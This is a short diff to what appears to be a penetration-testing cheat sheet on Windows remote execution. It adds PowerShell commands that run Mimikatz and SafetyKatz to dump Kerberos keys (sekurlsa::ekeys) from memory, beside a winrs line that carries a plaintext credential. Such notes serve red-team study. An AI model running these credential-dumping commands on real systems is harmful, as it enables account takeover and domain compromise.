@@ -28,7 +28,15 @@ winrs -remote:server1 -u:server1\admin -p:password hostname
 - winrs.vbs & COM Objects of WSMan Object
 ---
 ### Mimikatz
-- Dump creds, tickets
+__Dump Creds__
+```powershell
+Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
+```
+
+__Safetykatz__
+```powershell
+safetykatz.exe "sekurlsa::ekeys"
+```
 
 
 ---
